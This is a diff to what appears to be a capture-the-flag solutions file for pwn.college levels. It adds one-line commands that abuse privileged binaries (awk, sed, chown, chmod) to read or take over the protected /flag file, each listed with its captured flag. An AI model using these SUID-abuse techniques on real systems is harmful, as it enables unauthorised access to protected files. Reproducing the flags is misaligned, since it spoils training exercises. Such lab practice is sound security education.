@@ -99,6 +99,22 @@ pwn.college{0VOQzQpy9LX-ycBn2AI0mXrM7Wg.01M2EDLwIzW}
 find /flag -exec cat \{\} \;
 pwn.college{0xstlY-Sr422_KC7Q9qEXBJCIuy.01N2EDLwIzW}
 
+## Level34
+/bin/awk '{ print $1 }' /flag
+pwn.college{glq7ddgzpKyML8RqyDV4a7hgJQC.0lN3EDLwIzW}
+
+## Level35
+/bin/sed 's/pwn/pwn/1' /flag
+pwn.college{EtRbzYrJZRlAhJjBzZZWjCASBXu.01N3EDLwIzW}
+
+## Level37
+bin/chown -R hacker:root /flag
+pwn.college{YXyGMSEMOWQiKez--GQNzZaAyUd.0VO3EDLwIzW}
+
+## Level38
+/bin/chmod 777 /flag
+pwn.college{IySyvfWd40QDmx-ZDySpfKpfliG.0FM4EDLwIzW}
+
 ## Level39
 /bin/cp /flag /tmp/flag --no-preserve=mode
 pwn.college{cZqwJ2_7WV58QAM_3yykrJRzgGn.0VM4EDLwIzW}
